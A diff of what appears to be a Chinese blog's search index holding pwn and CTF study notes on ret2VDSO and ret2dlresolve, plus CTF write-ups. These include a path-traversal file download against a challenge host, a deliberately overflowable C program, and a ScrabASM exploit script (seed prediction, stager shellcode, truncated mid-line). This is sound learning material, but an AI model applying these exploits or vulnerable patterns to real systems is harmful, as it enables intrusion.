         <tag>fuzzing</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>学习笔记：ret2VDSO技术</title>
+    <url>/2026/01/30/2026-01-30-ret2VDSO%20%E6%8A%80%E6%9C%AF/</url>
+    <content><![CDATA[<h1 id="ret2VDSO-技术"><a href="#ret2VDSO-技术" class="headerlink" title="ret2VDSO 技术"></a>ret2VDSO 技术</h1><h2 id="一、例子"><a href="#一、例子" class="headerlink" title="一、例子"></a>一、例子</h2><p>好像 ret2VDSO 都是32位的例子，而且较新内核似乎无法完成 ret2VDSO，这里先了解一下吧</p>
+<h2 id="二、原理"><a href="#二、原理" class="headerlink" title="二、原理"></a>二、原理</h2><h3 id="i-简介"><a href="#i-简介" class="headerlink" title="i 简介"></a>i 简介</h3><ol>
+<li><em>VDSO (Virtual Dynamically-linked Shared Object)</em>：Linux 内核在用户空间映射的一段特殊共享库，通常显示为 <code>linux-vdso.so.1</code> 或 <code>linux-gate.so.1</code>。</li>
+<li>为了提供一些常用系统调用的用户态快速实现（如 <code>gettimeofday</code>、<code>clock_gettime</code>），避免频繁的用户态&#x2F;内核态切换。</li>
+<li>虽然表现为一个 <code>.so</code> 文件，但它并不存在于磁盘上，而是由内核在进程启动时映射到内存。</li>
+</ol>
+<h3 id="ii-补充"><a href="#ii-补充" class="headerlink" title="ii 补充"></a>ii 补充</h3><ol>
+<li>VDSO属于操作系统，它由内核生成，是内核在运行时动态构造并映射到进程地址空间。</li>
+<li>几乎每个用户态进程都会有一块 VDSO 区域，地址可能不同（受 ASLR 影响），但内容由内核统一提供。</li>
+<li>你的程序不需要显式链接 VDSO，内核会自动把它映射进去。即使你写一个最简单的 <code>int main(){return 0;}</code>，运行时也会有 VDSO。<em>就是说程序只是使用内核提供的VDSO共享区域，而不是像 ret2dlresolve 的符号表那样由程序生成</em></li>
+<li>与其说VDSO是一个共享库，不如说VDSO是内核映射出的一个共享区域(共享内存)，里面包含了一小段真正的可执行代码（ELF 格式的共享对象），提供一些常用系统调用的用户态实现。</li>
+</ol>
+<h2 id="三、调试"><a href="#三、调试" class="headerlink" title="三、调试"></a>三、调试</h2><p>首先简单说一下命令（最底层的接口，gdb 的 vmmap也可以找到）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/self/maps → 输出当前进程的内存映射信息。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /proc/self/auxv → 输出当前进程的 ELF 辅助向量信息。</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<h4 id="proc"><a href="#proc" class="headerlink" title="/proc"></a><code>/proc</code></h4><ul>
+<li>这是 Linux 的 <em>进程信息伪文件系统</em>（procfs）。</li>
+<li>作用：它不是存放在磁盘上的真实文件，而是内核提供的一种接口，用来查看和操作进程、内核状态。</li>
+<li>特点：里面的文件和目录都是动态生成的，反映的是系统当前的运行状态。</li>
+</ul>
+<h4 id="proc-self"><a href="#proc-self" class="headerlink" title="/proc/self"></a><code>/proc/self</code></h4><ul>
+<li><code>self</code> 是一个特殊的符号链接，始终指向 <em>当前进程的目录</em>。</li>
+<li>作用：在 <code>/proc</code> 下，每个进程都有一个以 PID 命名的目录，比如 <code>/proc/1234</code>。<ul>
+<li>如果你在进程 A 中访问 <code>/proc/self</code>，它就等价于 <code>/proc/&lt;A的PID&gt;</code>。</li>
+</ul>
+</li>
+</ul>
+<h4 id="proc-self-maps"><a href="#proc-self-maps" class="headerlink" title="/proc/self/maps"></a><code>/proc/self/maps</code></h4><ul>
+<li><code>maps</code> 指当前进程的 <em>内存映射表</em>。</li>
+<li>作用：列出进程地址空间中所有的内存区域，包括：<ul>
+<li>程序代码段、数据段</li>
+<li>堆 (<code>[heap]</code>)</li>
+<li>栈 (<code>[stack]</code>)</li>
+<li>动态库（如 libc）</li>
+<li>特殊区域（如 <code>[vdso]</code>）</li>
+</ul>
+</li>
+</ul>
+<h4 id="proc-self-auxv"><a href="#proc-self-auxv" class="headerlink" title="/proc/self/auxv"></a><code>/proc/self/auxv</code></h4><ul>
+<li><code>auxv</code>当前进程的 <strong>ELF 辅助向量</strong>。</li>
+<li>作用：这是内核在进程启动时传递给用户态的一组参数，包含运行环境信息，比如：<ul>
+<li><code>AT_SYSINFO_EHDR</code> → VDSO 的基址</li>
+<li><code>AT_EXECFN</code> → 可执行文件路径</li>
+<li><code>AT_PLATFORM</code> → CPU 架构</li>
+<li><code>AT_PAGESZ</code> → 页大小</li>
+</ul>
+</li>
+<li>用途：程序或调试器可以通过它直接获取 VDSO 基址、随机数种子等信息。</li>
+</ul>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Notes</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>ctf</tag>
+        <tag>stack-overflow</tag>
       </tags>
   </entry>
   <entry>
@@ -513,25 +603,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CTF题解：ezphp</title>
-    <url>/2026/02/01/2026-02-01-ezphp/</url>
-    <content><![CDATA[<h1 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h1><p>打开题目界面，需要输入用户名和密码，我们F12查看，可以发现用户名和密码是硬编码的，直接输入即可登录</p>
-<p><img src="/images/VNCTF2026/02-01-ezphp/passwd.png" alt="image-20260202140316527"></p>
-<p>登录后，发现需要想办法获取到拓展文件的路径然后下载它，尝试在文件下载接口输入 <code>/proc/self/maps</code>（<em>输出当前进程的内存映射信息，在ret2vdso调试部分详细解释</em>），就可以下载一个文件，打开后即可找到vuln.so路径</p>
-<p><img src="/images/VNCTF2026/02-01-ezphp/pass.png" alt="image-20260202141950226"></p>
-<p>接下来直接访问<a href="http://114.66.24.228:33951/download.php?path=/usr/local/lib/php/extensions/no-debug-non-zts-20240924/vuln.so%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%B8%8B%E8%BD%BD">http://114.66.24.228:33951/download.php?path=/usr/local/lib/php/extensions/no-debug-non-zts-20240924/vuln.so就可以下载</a> vuln.so</p>
-<p>查了一下这个.so文件好像是什么php扩展，反编译好多代码，有关堆的使用，不理解在干什么。没看懂，先放着了。</p>
-]]></content>
-      <categories>
-        <category>Writeup</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>ai</tag>
-        <tag>fuzzing</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>学习笔记：ret2dlsolve技术</title>
     <url>/2026/01/29/2026-01-29-ret2dlsolve%E6%8A%80%E6%9C%AF/</url>
     <content><![CDATA[<h1 id="ret2dlsolve-技术"><a href="#ret2dlsolve-技术" class="headerlink" title="ret2dlsolve 技术"></a>ret2dlsolve 技术</h1><h2 id="一、例子"><a href="#一、例子" class="headerlink" title="一、例子"></a>一、例子</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//显式写一个内联汇编函数，保证有一个pop rdi ; ret</span></span><br><span class="line">__attribute__((naked)) <span class="type">void</span> <span class="title function_">gadget</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__ <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop %rdi\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;ret\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop %rsi\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;ret\n\t&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 危险函数，存在栈溢出漏洞</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable_function</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter your message: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 没有限制输入长度，导致栈溢出</span></span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You entered: %s\n&quot;</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to ret2dlresolve demo!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PID: %d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    vulnerable_function();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -701,254 +772,6 @@
       </tags>
   </entry>
   <entry>
-    <title>学习笔记：ret2VDSO技术</title>
-    <url>/2026/01/30/2026-01-30-ret2VDSO%20%E6%8A%80%E6%9C%AF/</url>
-    <content><![CDATA[<h1 id="ret2VDSO-技术"><a href="#ret2VDSO-技术" class="headerlink" title="ret2VDSO 技术"></a>ret2VDSO 技术</h1><h2 id="一、例子"><a href="#一、例子" class="headerlink" title="一、例子"></a>一、例子</h2><p>好像 ret2VDSO 都是32位的例子，而且较新内核似乎无法完成 ret2VDSO，这里先了解一下吧</p>
-<h2 id="二、原理"><a href="#二、原理" class="headerlink" title="二、原理"></a>二、原理</h2><h3 id="i-简介"><a href="#i-简介" class="headerlink" title="i 简介"></a>i 简介</h3><ol>
-<li><em>VDSO (Virtual Dynamically-linked Shared Object)</em>：Linux 内核在用户空间映射的一段特殊共享库，通常显示为 <code>linux-vdso.so.1</code> 或 <code>linux-gate.so.1</code>。</li>
-<li>为了提供一些常用系统调用的用户态快速实现（如 <code>gettimeofday</code>、<code>clock_gettime</code>），避免频繁的用户态&#x2F;内核态切换。</li>
-<li>虽然表现为一个 <code>.so</code> 文件，但它并不存在于磁盘上，而是由内核在进程启动时映射到内存。</li>
-</ol>
-<h3 id="ii-补充"><a href="#ii-补充" class="headerlink" title="ii 补充"></a>ii 补充</h3><ol>
-<li>VDSO属于操作系统，它由内核生成，是内核在运行时动态构造并映射到进程地址空间。</li>
-<li>几乎每个用户态进程都会有一块 VDSO 区域，地址可能不同（受 ASLR 影响），但内容由内核统一提供。</li>
-<li>你的程序不需要显式链接 VDSO，内核会自动把它映射进去。即使你写一个最简单的 <code>int main(){return 0;}</code>，运行时也会有 VDSO。<em>就是说程序只是使用内核提供的VDSO共享区域，而不是像 ret2dlresolve 的符号表那样由程序生成</em></li>
-<li>与其说VDSO是一个共享库，不如说VDSO是内核映射出的一个共享区域(共享内存)，里面包含了一小段真正的可执行代码（ELF 格式的共享对象），提供一些常用系统调用的用户态实现。</li>
-</ol>
-<h2 id="三、调试"><a href="#三、调试" class="headerlink" title="三、调试"></a>三、调试</h2><p>首先简单说一下命令（最底层的接口，gdb 的 vmmap也可以找到）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/self/maps → 输出当前进程的内存映射信息。</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /proc/self/auxv → 输出当前进程的 ELF 辅助向量信息。</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<h4 id="proc"><a href="#proc" class="headerlink" title="/proc"></a><code>/proc</code></h4><ul>
-<li>这是 Linux 的 <em>进程信息伪文件系统</em>（procfs）。</li>
-<li>作用：它不是存放在磁盘上的真实文件，而是内核提供的一种接口，用来查看和操作进程、内核状态。</li>
-<li>特点：里面的文件和目录都是动态生成的，反映的是系统当前的运行状态。</li>
-</ul>
-<h4 id="proc-self"><a href="#proc-self" class="headerlink" title="/proc/self"></a><code>/proc/self</code></h4><ul>
-<li><code>self</code> 是一个特殊的符号链接，始终指向 <em>当前进程的目录</em>。</li>
-<li>作用：在 <code>/proc</code> 下，每个进程都有一个以 PID 命名的目录，比如 <code>/proc/1234</code>。<ul>
-<li>如果你在进程 A 中访问 <code>/proc/self</code>，它就等价于 <code>/proc/&lt;A的PID&gt;</code>。</li>
-</ul>
-</li>
-</ul>
-<h4 id="proc-self-maps"><a href="#proc-self-maps" class="headerlink" title="/proc/self/maps"></a><code>/proc/self/maps</code></h4><ul>
-<li><code>maps</code> 指当前进程的 <em>内存映射表</em>。</li>
-<li>作用：列出进程地址空间中所有的内存区域，包括：<ul>
-<li>程序代码段、数据段</li>
-<li>堆 (<code>[heap]</code>)</li>
-<li>栈 (<code>[stack]</code>)</li>
-<li>动态库（如 libc）</li>
-<li>特殊区域（如 <code>[vdso]</code>）</li>
-</ul>
-</li>
-</ul>
-<h4 id="proc-self-auxv"><a href="#proc-self-auxv" class="headerlink" title="/proc/self/auxv"></a><code>/proc/self/auxv</code></h4><ul>
-<li><code>auxv</code>当前进程的 <strong>ELF 辅助向量</strong>。</li>
-<li>作用：这是内核在进程启动时传递给用户态的一组参数，包含运行环境信息，比如：<ul>
-<li><code>AT_SYSINFO_EHDR</code> → VDSO 的基址</li>
-<li><code>AT_EXECFN</code> → 可执行文件路径</li>
-<li><code>AT_PLATFORM</code> → CPU 架构</li>
-<li><code>AT_PAGESZ</code> → 页大小</li>
-</ul>
-</li>
-<li>用途：程序或调试器可以通过它直接获取 VDSO 基址、随机数种子等信息。</li>
-</ul>
-</blockquote>
-]]></content>
-      <categories>
-        <category>Notes</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>ctf</tag>
-        <tag>stack-overflow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CTF题解：ScrabASM</title>
-    <url>/2026/02/09/2026-02-09-ScrabASM/</url>
-    <content><![CDATA[<h1 id="ScrabASM"><a href="#ScrabASM" class="headerlink" title="ScrabASM"></a>ScrabASM</h1><h2 id="一、题目分析"><a href="#一、题目分析" class="headerlink" title="一、题目分析"></a>一、题目分析</h2><p>查看程序，发现程序分配了一块固定地址 0x13370000 的可读可写可执行区域，还会执行这里的机器码。第一反应是构造 14 字节的 shellcode，但调试看了一下执行0x13370000时的寄存器状态根本无法构造出一个 14 字节的 shellcode，这是第一个难点。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HAND_SIZE 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOARD_ADDR 0x13370000UL</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">play</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *hand)</span> &#123;</span><br><span class="line">    <span class="type">void</span> *board = mmap((<span class="type">void</span> *)BOARD_ADDR, BOARD_SIZE,</span><br><span class="line">                       PROT_READ | PROT_WRITE | PROT_EXEC,</span><br><span class="line">                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (board == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;    mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;    Playing your word...&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;    TRIPLE WORD SCORE!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(board, hand, HAND_SIZE);</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))board)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>再看源码，发现程序会调用 rand() 来控制 0x13370000 区域的机器码，虽然可以通过swap再次通过 rand() 生成一个字节，但程序只会输出一次字节序列，就是我们无法知道swap的字节是什么，这是第二个难点。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">swap_tile</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *hand)</span> &#123;</span><br><span class="line">    <span class="type">char</span> line[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    Which tile? (0-%d): &quot;</span>, HAND_SIZE - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fgets(line, <span class="keyword">sizeof</span>(line), <span class="built_in">stdin</span>)) <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> idx = atoi(line);</span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span> || idx &gt;= HAND_SIZE) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;    Invalid tile!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    hand[idx] = rand() &amp; <span class="number">0xFF</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;    Tile swapped!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>看到rand()后，又出现一个想法，就是rand()生成的是伪随机数，由种子决定，能否通过覆盖种子来控制伪随机数生成？但是看遍了源码都没有找到任何有机会溢出的漏洞点。</p>
-<h2 id="二、漏洞"><a href="#二、漏洞" class="headerlink" title="二、漏洞"></a>二、漏洞</h2><p>隔了一天再看这道题，既然rand()依靠种子生成伪随机数，而种子通过当前的时间戳生成，srand(time(NULL))以秒为单位，所有只要在同一秒的时间去使用 srand(time(NULL))，生成的种子就相同，说明我们可以利用这一点在本地生成rand()伪随机数，以此推算出程序生成的伪随机数，甚至推算出需要swap多少次可以生成需要的数字。</p>
-<p>让ai写个脚本验证一下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">BINARY = <span class="string">&quot;./scrabASM&quot;</span></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">libc.srand.argtypes = [ctypes.c_uint]</span><br><span class="line">libc.rand.restype = ctypes.c_int</span><br><span class="line"></span><br><span class="line">p = process(BINARY)</span><br><span class="line"><span class="comment">#p = remote(&#x27;chall.lac.tf&#x27;, 31338)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your starting tiles:\n&quot;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">line = p.recvline().decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取 14 个 hex</span></span><br><span class="line">hexes = re.findall(<span class="string">r&#x27;([0-9a-fA-F]&#123;2&#125;)&#x27;</span>, line)</span><br><span class="line">real = [<span class="built_in">int</span>(x,<span class="number">16</span>) <span class="keyword">for</span> x <span class="keyword">in</span> hexes[:<span class="number">14</span>]]</span><br><span class="line"></span><br><span class="line">seed = <span class="built_in">int</span>(time.time()) <span class="comment"># - 1</span></span><br><span class="line">libc.srand(seed)</span><br><span class="line">pred = [libc.rand() &amp; <span class="number">0xFF</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;真实:&quot;</span>, <span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> real))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;预测:&quot;</span>, <span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> pred))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;匹配?&quot;</span>, real == pred)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>在 seed &#x3D; int(time.time()) 那里，由于远程可能会有延迟，所以远程时需要 -1 秒。</p>
-<p>很完美，本地预测随机数和程序生成的随机数一模一样，说明这个方法完全可行，只要本地生成之后的随机数，就可以反推出每个tile需要swap多少次，第一个困难已经解决。接下来，我们需要考虑这里的shellcode应该如何布置。</p>
-<p><img src="/images/26-02-09-scrabASM/test.png" alt="image-20260209162215228"></p>
-<p>这里先来看一下执行 0x13370000 时的寄存器状态</p>
-<p><img src="/images/26-02-09-scrabASM/register.png" alt="image-20260209163230746"></p>
-<p>很明显，这些寄存器状态无法直接构造 14 字节的 shellcode （execve）。但是，仔细查看源码，虽然只限制读入 14 字节的机器码，但是却分配了 0x1000 字节的可读可写可执行区域。思考：对于14字节shellcode，我们无法直接构造execve，那是否可以构造一个read，然后在此区域读取更多字节，给execve的shellcode创造足够的空间？</p>
-<p>利用当前寄存器状态，我构造了如下字节序列</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0x48</span>, <span class="number">0x87</span>, <span class="number">0xfe</span>,       <span class="comment"># xchg rdi, rsi    ; rsi 已是 0x13370000</span></span><br><span class="line"><span class="number">0x6a</span>, <span class="number">0x00</span>,             <span class="comment"># push 0</span></span><br><span class="line"><span class="number">0x5f</span>,                   <span class="comment"># pop rdi          ; rdi = 0 (stdin)</span></span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd6</span>,       <span class="comment"># add rsi, rdx     ; rsi = 0x1337000e (因为 rdx=14)</span></span><br><span class="line"><span class="number">0x5a</span>,                   <span class="comment"># pop rdx          ; rdx = 栈上的大数值</span></span><br><span class="line"><span class="number">0x31</span>, <span class="number">0xc0</span>,             <span class="comment"># xor eax, eax     ; rax = 0 (read)</span></span><br><span class="line"><span class="number">0x0f</span>, <span class="number">0x05</span>              <span class="comment"># syscall          ; read(0, 0x1337000e, 大数值)</span></span><br></pre></td></tr></table></figure>
-
-<p>刚好14字节，这里利用栈上的数据（肯定远远大于14）作为 rdx，构造出一个read(0, 0x1337000e, 大数值)，并且读入的位置刚好时syscall后面，就紧接着执行第二次输入的shellcode（execve），获得shell</p>
-<p>思路如上，之后因为需要多次swap，又加了一些自动化swap脚本，然后就可以获得shell。远程连接时如果需要swap的次数太多可能会被服务器给ban了，导致执行到一半就EOF，多打几次应该就行，反正本地挺稳的。我觉得这道题是有难度的，但看解出的人很多，可能我把它想复杂了也不一定。。。</p>
-<p><img src="/images/26-02-09-scrabASM/shell.png" alt="image-20260209170155209"></p>
-<p>完整exp如下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">libc.srand.argtypes = [ctypes.c_uint]</span><br><span class="line">libc.rand.restype = ctypes.c_int</span><br><span class="line"></span><br><span class="line">HAND_SIZE = <span class="number">14</span></span><br><span class="line">MAX_SWAP_TRIES = <span class="number">20000</span>   <span class="comment"># 防止死循环，足够大</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./scrabASM&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;chall.lac.tf&#x27;, 31338)</span></span><br><span class="line"></span><br><span class="line">TARGET = [</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x87</span>, <span class="number">0xfe</span>,       <span class="comment"># xchg rdi, rsi    ; rsi 已是 0x13370000</span></span><br><span class="line">    <span class="number">0x6a</span>, <span class="number">0x00</span>,             <span class="comment"># push 0</span></span><br><span class="line">    <span class="number">0x5f</span>,                   <span class="comment"># pop rdi          ; rdi = 0 (stdin)</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd6</span>,       <span class="comment"># add rsi, rdx     ; rsi = 0x1337000e (因为 rdx=14)</span></span><br><span class="line">    <span class="number">0x5a</span>,                   <span class="comment"># pop rdx          ; rdx = 栈上的大数值</span></span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0xc0</span>,             <span class="comment"># xor eax, eax     ; rax = 0 (read)</span></span><br><span class="line">    <span class="number">0x0f</span>, <span class="number">0x05</span>              <span class="comment"># syscall          ; read(0, 0x1337000e, 大数值)</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收初始 hand</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your starting tiles:\n&quot;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">line = p.recvline().decode()</span><br><span class="line">hexes = re.findall(<span class="string">r&#x27;([0-9a-fA-F]&#123;2&#125;)&#x27;</span>, line) <span class="comment"># 提取 14 个 hex</span></span><br><span class="line">real = [<span class="built_in">int</span>(x,<span class="number">16</span>) <span class="keyword">for</span> x <span class="keyword">in</span> hexes[:<span class="number">14</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 预测种子</span></span><br><span class="line">seed = <span class="built_in">int</span>(time.time())<span class="comment"># - 1</span></span><br><span class="line">libc.srand(seed)</span><br><span class="line">pred = [libc.rand() &amp; <span class="number">0xFF</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;真实:&quot;</span>, <span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> real))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;预测:&quot;</span>, <span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> pred))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;匹配?&quot;</span>, real == pred)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> real != pred:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;预测与实际不匹配，脚本退出&quot;</span>)</span><br><span class="line">    p.close()</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;种子匹配成功！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ────────────────────────────────────────────────</span></span><br><span class="line"><span class="comment"># 匹配成功 → 继续生成后续 rand 序列，并计算 swap 次数</span></span><br><span class="line"><span class="comment"># ────────────────────────────────────────────────</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新同步随机数生成器</span></span><br><span class="line">libc.srand(seed)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(HAND_SIZE):</span><br><span class="line">    libc.rand()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成后续可用的 rand 值（足够多）</span></span><br><span class="line">future_rand = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(MAX_SWAP_TRIES + <span class="number">100</span>):</span><br><span class="line">    future_rand.append(libc.rand() &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n后续 rand 值已生成（前10个示例）：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> future_rand[:<span class="number">10</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_hand = real[:]              <span class="comment"># 当前 hand 状态</span></span><br><span class="line">swap_counts = [<span class="number">0</span>] * HAND_SIZE       <span class="comment"># 记录每个位置需要 swap 多少次</span></span><br><span class="line">rand_idx = <span class="number">0</span>                        <span class="comment"># 指向 future_rand 的下标</span></span><br><span class="line">unfinished = <span class="built_in">set</span>(<span class="built_in">range</span>(HAND_SIZE))  <span class="comment"># 未完成的 tile</span></span><br><span class="line">execution_order = []                <span class="comment"># 记录处理顺序 (pos, times)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> unfinished:</span><br><span class="line">    best_pos = <span class="literal">None</span></span><br><span class="line">    best_tries = <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">list</span>(unfinished):</span><br><span class="line">        target = TARGET[pos]</span><br><span 